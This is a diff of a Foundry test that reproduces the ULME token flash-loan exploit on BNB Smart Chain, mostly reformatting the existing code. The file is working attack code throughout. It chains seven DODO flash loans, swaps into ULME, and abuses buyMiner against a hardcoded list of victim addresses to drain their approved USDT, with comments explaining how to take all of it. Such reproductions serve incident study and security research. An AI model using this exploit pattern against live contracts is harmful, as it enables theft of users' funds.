@@ -2,8 +2,11 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
+import {IERC20Metadata as IERC20} from "OpenZeppelin/interfaces/IERC20Metadata.sol";
+
+import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
+import {IDPPOracle} from "src/interfaces/IDPPOracle.sol";
 // @KeyInfo - Total Lost : ~250k US$ which resulted in ~50k profit
 // Attacker : 0x056c20ab7e25e4dd7e49568f964d98e415da63d3
 // Attack Contract : 0x8523c7661850d0da4d86587ce9674da23369ff26
@@ -16,33 +19,37 @@ import "./../interface.sol";
 // Neptune Mutual: https://medium.com/neptune-mutual/decoding-ulme-token-flash-loan-attack-56470d261787
 
 interface IULME is IERC20 {
-
     function buyMiner(address user, uint256 usdt) external returns (bool);
-
 }
 
 interface IDVM {
-
-    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
-
+    function flashLoan(
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        address assetTo,
+        bytes calldata data
+    ) external;
 }
 
 interface IDPP {
-
-    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
-
+    function flashLoan(
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        address assetTo,
+        bytes calldata data
+    ) external;
 }
 
 interface IDPPAdvanced {
-
-    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
-
+    function flashLoan(
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        address assetTo,
+        bytes calldata data
+    ) external;
 }
 
 contract ULMEAttacker is Test {
-
-    CheatCodes constant cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
     address constant dodo1 = 0x910d4354d34E0F1EF31d22a687BE191A1aE0cA5F;
     address constant dodo2 = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
@@ -51,77 +58,124 @@ contract ULMEAttacker is Test {
     address constant dodo5 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
     address constant dodo6 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
     address constant dodo7 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
-    IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IPancakeRouter constant router =
+        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IULME constant ulme = IULME(0xAE975a25646E6eB859615d0A147B909c13D31FEd);
 
     function setUp() public {
-        cheats.createSelectFork("bsc");
-        cheats.label(address(usdt), "USDT");
-        cheats.label(address(dodo1), "dodo1");
-        cheats.label(address(dodo2), "dodo2");
-        cheats.label(address(dodo3), "dodo3");
-        cheats.label(address(dodo4), "dodo4");
-        cheats.label(address(dodo5), "dodo5");
-        cheats.label(address(dodo6), "dodo6");
-        cheats.label(address(dodo7), "dodo7");
-        cheats.label(address(router), "router");
-        cheats.label(address(ulme), "ulme");
+        vm.createSelectFork("bsc");
+        vm.label(address(usdt), "USDT");
+        vm.label(address(dodo1), "dodo1");
+        vm.label(address(dodo2), "dodo2");
+        vm.label(address(dodo3), "dodo3");
+        vm.label(address(dodo4), "dodo4");
+        vm.label(address(dodo5), "dodo5");
+        vm.label(address(dodo6), "dodo6");
+        vm.label(address(dodo7), "dodo7");
+        vm.label(address(router), "router");
+        vm.label(address(ulme), "ulme");
     }
 
     function testExploit() external {
         uint256 attackBlockNumber = 22_476_695;
-        cheats.rollFork(attackBlockNumber);
+        vm.rollFork(attackBlockNumber);
 
         uint256 startBalance = usdt.balanceOf(address(this));
-        emit log_named_decimal_uint("Initial attacker USDT", startBalance, usdt.decimals());
+        emit log_named_decimal_uint(
+            "Initial attacker USDT",
+            startBalance,
+            usdt.decimals()
+        );
         uint256 dodo1USDT = usdt.balanceOf(dodo1);
         // start flashloan
         IDVM(dodo1).flashLoan(0, dodo1USDT, address(this), abi.encode("dodo1"));
 
         // attack end
         uint256 endBalance = usdt.balanceOf(address(this));
-        emit log_named_decimal_uint("Total profit USDT", endBalance - startBalance, usdt.decimals());
+        emit log_named_decimal_uint(
+            "Total profit USDT",
+            endBalance - startBalance,
+            usdt.decimals()
+        );
     }
 
     function dodoCall(
-        address, /*sender*/
-        uint256, /*baseAmount*/
+        address /*sender*/,
+        uint256 /*baseAmount*/,
         uint256 quoteAmount,
         bytes calldata /*data*/
     ) internal {
         if (msg.sender == dodo1) {
             uint256 dodo2USDT = usdt.balanceOf(dodo2);
-            IDPPAdvanced(dodo2).flashLoan(0, dodo2USDT, address(this), abi.encode("dodo2"));
+            IDPPAdvanced(dodo2).flashLoan(
+                0,
+                dodo2USDT,
+                address(this),
+                abi.encode("dodo2")
+            );
             usdt.transfer(dodo1, quoteAmount);
         } else if (msg.sender == dodo2) {
             uint256 dodo3USDT = usdt.balanceOf(dodo3);
-            IDPPOracle(dodo3).flashLoan(0, dodo3USDT, address(this), abi.encode("dodo3"));
+            IDPPOracle(dodo3).flashLoan(
+                0,
+                dodo3USDT,
+                address(this),
+                abi.encode("dodo3")
+            );
             usdt.transfer(dodo2, quoteAmount);
         } else if (msg.sender == dodo3) {
             uint256 dodo4USDT = usdt.balanceOf(dodo4);
-            IDPP(dodo4).flashLoan(0, dodo4USDT, address(this), abi.encode("dodo4"));
+            IDPP(dodo4).flashLoan(
+                0,
+                dodo4USDT,
+                address(this),
+                abi.encode("dodo4")
+            );
             usdt.transfer(dodo3, quoteAmount);
         } else if (msg.sender == dodo4) {
             uint256 dodo5USDT = usdt.balanceOf(dodo5);
-            IDPPAdvanced(dodo5).flashLoan(0, dodo5USDT, address(this), abi.encode("dodo5"));
+            IDPPAdvanced(dodo5).flashLoan(
+                0,
+                dodo5USDT,
+                address(this),
+                abi.encode("dodo5")
+            );
             usdt.transfer(dodo4, quoteAmount);
         } else if (msg.sender == dodo5) {
             uint256 dodo6USDT = usdt.balanceOf(dodo6);
-            IDPPOracle(dodo6).flashLoan(0, dodo6USDT, address(this), abi.encode("dodo6"));
+            IDPPOracle(dodo6).flashLoan(
+                0,
+                dodo6USDT,
+                address(this),
+                abi.encode("dodo6")
+            );
             usdt.transfer(dodo5, quoteAmount);
         } else if (msg.sender == dodo6) {
             uint256 dodo7USDT = usdt.balanceOf(dodo7);
-            IDPPOracle(dodo7).flashLoan(0, dodo7USDT, address(this), abi.encode("dodo7"));
+            IDPPOracle(dodo7).flashLoan(
+                0,
+                dodo7USDT,
+                address(this),
+                abi.encode("dodo7")
+            );
             usdt.transfer(dodo6, quoteAmount);
         } else if (msg.sender == dodo7) {
             // flashloan end, start attack
-            emit log_named_decimal_uint("Total borrowed USDT", usdt.balanceOf(address(this)), usdt.decimals());
+            emit log_named_decimal_uint(
+                "Total borrowed USDT",
+                usdt.balanceOf(address(this)),
+                usdt.decimals()
+            );
 
             // approve before swap
             usdt.approve(address(router), type(uint256).max);
             ulme.approve(address(router), type(uint256).max);
             USDT2ULME();
-            emit log_named_decimal_uint("Total exchanged ULME", ulme.balanceOf(address(this)), ulme.decimals());
+            emit log_named_decimal_uint(
+                "Total exchanged ULME",
+                ulme.balanceOf(address(this)),
+                ulme.decimals()
+            );
 
             address[] memory victims = new address[](101);
             victims[0] = 0x4A005e5E40Ce2B827C873cA37af77e6873e37203;
@@ -235,14 +289,18 @@ contract ULMEAttacker is Test {
                 uint256 available = balance <= allowance ? balance : allowance; // available USDT
 
                 if (available > 0) {
-                    uint256 amount = available * 10 / 11; // according to the buyMiner function, *10/11 to drain all USDT
+                    uint256 amount = (available * 10) / 11; // according to the buyMiner function, *10/11 to drain all USDT
                     ulme.buyMiner(victim, amount);
                     lost += available;
                 } else {
                     emit log_named_address("Insufficient USDT", victim);
                 }
             }
-            emit log_named_decimal_uint("Total lost USDT", lost, usdt.decimals());
+            emit log_named_decimal_uint(
+                "Total lost USDT",
+                lost,
+                usdt.decimals()
+            );
 
             ULME2USDT();
 
@@ -250,11 +308,21 @@ contract ULMEAttacker is Test {
         }
     }
 
-    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
+    function DVMFlashLoanCall(
+        address sender,
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        bytes calldata data
+    ) external {
         dodoCall(sender, baseAmount, quoteAmount, data);
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
+    function DPPFlashLoanCall(
+        address sender,
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        bytes calldata data
+    ) external {
         dodoCall(sender, baseAmount, quoteAmount, data);
     }
 
@@ -263,7 +331,11 @@ contract ULMEAttacker is Test {
         path[0] = address(usdt);
         path[1] = address(ulme);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            1_000_000 ether, 0, path, address(this), block.timestamp
+            1_000_000 ether,
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
 
@@ -272,12 +344,11 @@ contract ULMEAttacker is Test {
         path[0] = address(ulme);
         path[1] = address(usdt);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens( // ULME token has transfer fees
-            ulme.balanceOf(address(this)) - 100, // can not swap all, according to the transactionFee function
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+                ulme.balanceOf(address(this)) - 100, // can not swap all, according to the transactionFee function
+                0,
+                path,
+                address(this),
+                block.timestamp
+            );
     }
-
 }
